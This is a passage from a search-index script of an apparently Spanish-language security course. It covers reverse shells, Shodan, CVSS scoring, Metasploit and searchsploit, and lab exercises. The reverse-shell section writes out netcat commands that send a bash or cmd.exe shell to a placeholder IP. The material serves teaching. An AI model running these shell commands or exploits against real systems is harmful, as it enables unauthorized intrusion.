4444\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eTambién pueden usar \u003ca href=\"https://github.com/calebstewart/pwncat\"\u003epwncat\u003c/a\u003e, que está hecho para reverse shells,\ny tiene más características, como autocompletado con TAB.\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003epwncat --listen --port 4444\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch3 id=\"servidor\"\u003eServidor\u003c/h3\u003e\n\u003cp\u003eEn el servidor usualmente no se tiene control de los programas instalados, por lo que se tendrán que adaptar\na lo que encuentren ahí. De todas formas, casi siempre está instalado \u003ccode\u003enc\u003c/code\u003e o \u003ccode\u003enc.exe\u003c/code\u003e. Para iniciar la conexión\na la IP \u003ccode\u003e1.2.3.4\u003c/code\u003e y puerto \u003ccode\u003e4444\u003c/code\u003e, levantar la shell y redirigir la entrada y salida estándar, se ejecuta lo siguiente:\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003enc -c /bin/bash 1.2.3.4 4444\nnc.exe 1.2.3.4 4444 -e cmd.exe\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch3 id=\"prueba-de-concepto\"\u003ePrueba de Concepto\u003c/h3\u003e\n\u003cp\u003eEjecutamos lo descrito anteriormente, con una misma máquina funcionando como cliente y servidor. En el lado\ndel servidor no se ve nada muy interesante:\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"../reverse-shell-server.png\" alt=\"Reverse Shell Server\"\u003e\u003c/p\u003e\n\u003cp\u003ePero el cliente ahora tiene una shell nueva:\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"../reverse-shell-client.png\" alt=\"Reverse Shell Client\"\u003e\u003c/p\u003e\n"},{id:31,href:"/docs/osint/shodan/",title:"Shodan",description:null,content:"\u003cp\u003e\u003ca href=\"https://www.shodan.io/\"\u003eShodan\u003c/a\u003e es un motor de búsqueda que permite encontrar tipos específicos de computadores o dispositivos\nconectados a internet. Para esto implementa una variedad de filtros que ayudan en la búsqueda,\nde forma de hacerla más rápida y efectiva. Dentro de estos resultados pueden encontrar servicios mal\nconfigurados, los cuales no implementan medidas de seguridad y son accesibles para cualquier persona.\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eImportante\u003c/strong\u003e: En Shodan pueden encontrar servicios privados a los cuales ustedes no tienen permiso de ingresar.\n\u003cstrong\u003eNo interactúen con estos servicios\u003c/strong\u003e, no intenten sacar información ni entren a revisar de qué se trata.\nPueden estar violando la privacidad de ciertas personas y luego caer en problemas legales.\u003c/p\u003e\n\u003ch2 id=\"ejemplo\"\u003eEjemplo\u003c/h2\u003e\n\u003cp\u003eEn Shodan podemos buscar por casi cualquier tipo de dispositivo. En este ejemplo buscaremos termostatos\nconectados a internet. Para eso ingresamos al sitio y buscamos la palabra \u003ccode\u003ethermostat\u003c/code\u003e.\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"../shodan-thermostat.png\" alt=\"Shodan Thermostat Search\"\u003e\u003c/p\u003e\n\u003cp\u003eHaciendo click en uno de los resultados cualquiera podemos ver la región a la cual pertenece, los puertos que\ntiene abiertos y el servicio que ofrece en cada puerto.\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"../shodan-result-details.png\" alt=\"Shodan Result Details\"\u003e\u003c/p\u003e\n"},{id:32,href:"/docs/apps-web/cve/",title:"Common Vulnerabilities and Exposures",description:null,content:"\u003cp\u003eMuchas veces ustedes se encontrarán con sistemas (web u otro tipo) que utilizan software con vulnerabilidades\nconocidas (punto 9 del OWASP Top 10). Estas vulnerabilidades se catalogan como \u003cem\u003eCommon Vulnerabilities and\nExposures\u003c/em\u003e (CVE), el cual es un sistema que intenta proveer información y documentación sobre\nvulnerabilidades conocidas públicamente. Esto se suele documentar junto a su puntaje\n\u003ca href=\"https://www.first.org/cvss/v3.1/specification-document\"\u003eCVSS\u003c/a\u003e (\u003cem\u003eCommon Vulnerabilities Scoring System\u003c/em\u003e).\u003c/p\u003e\n\u003ch2 id=\"cvss\"\u003eCVSS\u003c/h2\u003e\n\u003cp\u003eEs un sistema abierto para comunicar las características y severidad de vulnerabilidades conocidas en software.\nProduce un puntaje de 0 a 10 indicando la explotabilidad de la vulnerabilidad en cuestión.\nEstos puntajes se categorizan de la siguiente manera:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eInformative\u003c/strong\u003e (0.0): La vulnerabilidad no es explotable pero puede entregar información o recursos que\npermiten o facilitan la explotación de otra vulnerabilidad. Ejemplo: revelar rutas absolutas de archivos\nen el servidor.\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eLow\u003c/strong\u003e (0.1 - 3.9): La vulnerabilidad es muy difícil de explotar, o los recursos ganados luego de explotarla\nno son muy relevantes. Ejemplo: divulgación o enumeración de usuarios del sistema.\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eMedium\u003c/strong\u003e (4.0 - 6.9): No se requiere tanto esfuerzo para explotar la vulnerabilidad, pero los componentes\ncomprometidos no son críticos. Ejemplo: poder interceptar información no sensible ni privada de otros usuarios.\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eHigh\u003c/strong\u003e (7.0 - 8.9): Se puede comprometer un ámbito completo del sistema (confidencialidad, integridad\no disponibilidad). Ejemplo: poder leer toda la información de todos los usuarios.\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eCritical\u003c/strong\u003e (9.0 - 10): Se compromete el sistema completo, permitiéndole al atacante leer y modificar\ntoda la información y componentes o denegar el servicio. Ejemplo: obtener acceso a la cuenta de administrador\ndel sistema.\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eEste puntaje se calcula de manera pseudo objetiva, teniendo en cuenta métricas base, temporales y\nambientales.\u003c/p\u003e\n\u003ch3 id=\"métricas-base\"\u003eMétricas Base\u003c/h3\u003e\n\u003cp\u003eLas métricas base intentan describir a la vulnerabilidad de manera aislada y teórica,\nutilizando los siguientes datos:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eAttack Vector\u003c/strong\u003e (Network, Adjacent, Local, Physical).\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eAttack Complexity\u003c/strong\u003e (Low, High).\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003ePrivileges Required\u003c/strong\u003e (None, Low, High).\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eUser Interaction\u003c/strong\u003e (None, Required).\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eScope\u003c/strong\u003e (Unchanged, Changed).\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eConfidentiality\u003c/strong\u003e (None, Low, High).\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eIntegrity\u003c/strong\u003e (None, Low, High).\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eAvailability\u003c/strong\u003e (None, Low, High).\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"métricas-temporales\"\u003eMétricas Temporales\u003c/h3\u003e\n\u003cp\u003eLas métricas temporales incluyen factores sobre el estado de los exploits para la vulnerabilidad en cuestión\nen la actualidad, los que varían en el tiempo:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eExploit Code Maturity\u003c/strong\u003e (Not defined, Unproven that exploit exists, Proof of concept code,\nFunctional exploit exists, High).\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eRemediation Level\u003c/strong\u003e (Not Defined, Official fix, Temporary fix, Workaround, Unavailable).\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eReport Confidence\u003c/strong\u003e (Not Defined, Unknown, Reasonable, Confirmed).\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"métricas-ambientales\"\u003eMétricas Ambientales\u003c/h3\u003e\n\u003cp\u003eFinalmente, las métricas de tipo ambientales son específicas para los dueños del sistema afectado, e intentan\ncuantificar la importancia de la vulnerabilidad en el entorno en el cual se encuentra.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eAttack Vector\u003c/strong\u003e (Not Defined, Network, Adjacent Network, Local, Physical).\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eAttack Complexity\u003c/strong\u003e (Not Defined, Low, High).\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003ePrivileges Required\u003c/strong\u003e (Not Defined, None, Low, High).\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eUser Interaction\u003c/strong\u003e (Not Defined, None, Required).\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eScope\u003c/strong\u003e (Not Defined, Unchanged, Changed).\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eConfidentiality\u003c/strong\u003e (Not Defined, None, Low, High).\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eIntegrity\u003c/strong\u003e (Not Defined, None, Low, High).\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eAvailability\u003c/strong\u003e (Not Defined, None, Low, High).\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eConfidentiality Requirement\u003c/strong\u003e (Not Defined, Low, Medium, High).\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eIntegrity Requirement\u003c/strong\u003e (Not Defined, Low, Medium, High).\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eAvailability Requirement\u003c/strong\u003e (Not Defined, Low, Medium, High).\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"herramientas\"\u003eHerramientas\u003c/h2\u003e\n\u003cp\u003eLa herramienta más conocida y utilizada para la explotación de CVEs es \u003ca href=\"https://github.com/rapid7/metasploit-framework\"\u003eMetasploit\u003c/a\u003e,\nel cual es un repositorio de vulnerabilidades parametrizadas, para facilitar su explotación.\nAdemás está \u003ca href=\"https://www.exploit-db.com/searchsploit\"\u003esearchsploit\u003c/a\u003e, que es un repositorio con descripciones\ny pruebas de concepto para algunos CVE que no aparecen en Metasploit.\u003c/p\u003e\n\u003cp\u003eSin embargo no todos los CVEs están en esas herramientas, y tendrán que buscarlos en internet.\nAlgunos sitios útiles son:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://www.exploit-db.com/\"\u003ehttps://www.exploit-db.com/\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://vuldb.com/\"\u003ehttps://vuldb.com/\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://www.cvedetails.com/vulnerability-list/vendor_id-16542/Laravel.html\"\u003ehttps://www.cvedetails.com/\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://medium.com/\"\u003ehttps://medium.com/\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/\"\u003ehttps://github.com/\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eEn estos podrán encontrar códigos, pruebas de concepto, y guías paso a paso sobre cómo funcionan algunas\nvulnerabilidades.\u003c/p\u003e\n\u003ch2 id=\"ejemplo\"\u003eEjemplo\u003c/h2\u003e\n\u003cp\u003ePara iniciar Metasploit deben correr el siguiente comando como \u003ccode\u003eroot\u003c/code\u003e:\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003emsfdb run\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eLuego pueden buscar dentro del repositorio de vulnerabilidades por palabras clave \u003ccode\u003esearch \u0026lt;keyword\u0026gt;\u003c/code\u003e:\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"../metasploit-search.png\" alt=\"Metasploit Search\"\u003e\u003c/p\u003e\n\u003cp\u003eFinalmente, para elegir un exploit, pueden ejecutar \u003ccode\u003euse \u0026lt;num\u0026gt;\u003c/code\u003e con el número del exploit en la lista retornada\nde la búsqueda.\u003c/p\u003e\n\u003cp\u003eRecuerden que \u003cstrong\u003elas vulnerabilidades varían entre versiones de cada software\u003c/strong\u003e, por lo que no necesariamente\npodrán explotarlas siempre.\u003c/p\u003e\n\u003cp\u003ePueden encontrar un tutorial bastante completo de Metasploit\n\u003ca href=\"https://www.tutorialspoint.com/metasploit/index.htm\"\u003eaquí\u003c/a\u003e.\u003c/p\u003e\n\u003cp\u003ePara buscar exploits en searchsploit, simplemente usar el comando \u003ccode\u003esearchsploit \u0026lt;keyword\u0026gt;\u003c/code\u003e:\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"../searchsploit-searching.png\" alt=\"Searchsploit Searching\"\u003e\u003c/p\u003e\n\u003cp\u003eEsto les retornará una lista de exploits con un nombre y una ruta al archivo con la descripción o prueba de concepto.\nSi el archivo es \u003ccode\u003e.rb\u003c/code\u003e significa que existe un módulo de Metasploit implementado. Sino, tendrán que leer la\ndescripción e llevar a cabo la explotación de manera manual.\u003c/p\u003e\n\u003cp\u003eLos archivos están nombrados con un código numérico que los identifica. Si quieren ver el archivo,\npueden imprimir la ruta completa a este usando \u003ccode\u003esearchsploit -p \u0026lt;code\u0026gt;\u003c/code\u003e:\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"../searchsploit-path.png\" alt=\"Searchsploit Path\"\u003e\u003c/p\u003e\n"},{id:33,href:"/docs/intro/",title:"Intro a la programación",description:"Conceptos básicos necesarios para programar",content:""},{id:34,href:"/docs/anexos/",title:"Anexos",description:null,content:""},{id:35,href:"/docs/forense/",title:"Análisis Forense",description:null,content:""},{id:36,href:"/docs/apps-web/",title:"Aplicaciones Web",description:"Análisis web, OWASP, técnicas básicas, inyecciones, RCE, CVE, reverse shell",content:""},{id:37,href:"/docs/cripto-moderna/",title:"Criptografía moderna",description:"Criptografía simétrica, asimétrica, hashing y firmas",content:""},{id:38,href:"/docs/apps-web/ejercicios/",title:"Ejercicios Apps Web",description:null,content:"\u003ch2 id=\"web-i\"\u003eWeb I\u003c/h2\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003eCrearse una cuenta en \u003ca href=\"https://www.hackthebox.eu/\"\u003eHack The Box\u003c/a\u003e.\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eHacer el challenge \u003ccode\u003eCanvas\u003c/code\u003e de la categoría \u003ccode\u003eMisc\u003c/code\u003e en \u003ca href=\"https://www.hackthebox.eu/home/challenges/Misc\"\u003eHTB\u003c/a\u003e.\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eResolver los labs de \u003ca href=\"https://portswigger.net/web-security/information-disclosure\"\u003eInformation disclosure\u003c/a\u003e\nde PortSwigger. Necesitarán una cuenta para ver los labs de PortSwigger.\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch2 id=\"web-ii\"\u003eWeb II\u003c/h2\u003e\n\u003col start=\"4\"\u003e\n\u003cli\u003e\n\u003cp\u003eCompletar el \u003ca href=\"https://xss-game.appspot.com/\"\u003eXSS Game\u003c/a\u003e hecho por Google. En este verán distintos tipos de\nXSS y tendrán que evadir filtros.\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eResolver los laboratorios de \u003ca href=\"https://portswigger.net/web-security/cross-site-scripting\"\u003eCross-Site Scripting\u003c/a\u003e\nde PortSwigger.\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eResolver los laboratorios de \u003ca href=\"https://portswigger.net/web-security/sql-injection\"\u003eSQL injection\u003c/a\u003e\nde PortSwigger. Resolver primero de manera manual y luego usando sqlmap.\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eResolver los laboratorios de \u003ca href=\"https://portswigger.net/web-security/os-command-injection\"\u003eOS Command Injection\u003c/a\u003e\nde PortSwigger.\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch2 id=\"web-iii\"\u003eWeb III\u003c/h2\u003e\n\u003col start=\"8\"\u003e\n\u003cli\u003eEn \u003ca href=\"https://github.com/digininja/DVWA\"\u003eDamn Vulnerable Web Application\u003c/a\u003e aprovecharse del RCE en\nlas secciones de \u003ccode\u003eCommand Injection\u003c/code\u003e y \u003ccode\u003eFile Upload\u003c/code\u003e para obtener una shell reversa.\u003c/li\u003e\n\u003c/ol\u003e\n"},{id:39,href:"/docs/reversa/",title:"Ingeniería Reversa",description:null,content:""},{id:40,href:"/docs/osint/",title:"OSINT",description:null,content:""},{id:41,href:"/docs/prologo/",title:"Prólogo",description:"Introducción y definiciones de conceptos",content:""},{id:42,href:"/docs/pwning/",title:"Pwning",description:null,content:""},{id:43,href:"/docs/",title:"Apunte",description:"Apunte para la Programación Competitiva",content:""},];index.add(docs);userinput.addEventListener('input',show_results,true);suggestions.addEventListener('click',accept_suggestion,true);function show_results(){var value=this.value;var results=index.search(value,5);var entry,childs=suggestions.childNodes;var i=0,len=results.length;suggestions.classList.remove('d-none');results.forEach(function(page){entry=document.createElement('div');entry.innerHTML='<a href><span></span><span></span></a>';a=entry.querySelector('a'),t=entry.querySelector('span:first-child'),d=entry.querySelector('span:nth-child(2)');a.href=page.href;t.textContent=page.title;d.textContent=page.description;suggestions.appendChild(entry);});while(childs.length>len){suggestions.removeChild(childs[i])}}
function accept_suggestion(){while(suggestions.lastChild){suggestions.removeChild(suggestions.lastChild);}
return false;}}());